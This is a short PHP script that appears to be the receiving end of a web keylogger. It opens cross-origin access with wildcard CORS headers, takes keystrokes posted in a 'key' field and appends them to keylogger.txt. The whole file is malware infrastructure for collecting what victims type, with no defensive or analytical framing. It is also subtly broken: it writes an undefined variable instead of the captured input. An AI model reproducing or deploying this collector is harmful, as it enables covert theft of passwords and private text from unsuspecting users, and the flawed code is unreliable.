<?php

    header("Access-Control-Allow-Origin: *");
    header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
    header("Access-Control-Allow-Headers: Content-Type");


    $keys = $_POST["key"];
    $filename = 'keylogger.txt';
    $file = fopen($filename, 'a+');
    if ($file) {
        fwrite($file, $v);
        fclose($file);
    }
    else {
        echo "Erreur lors de l'ouverture du fichier.";
    }
?>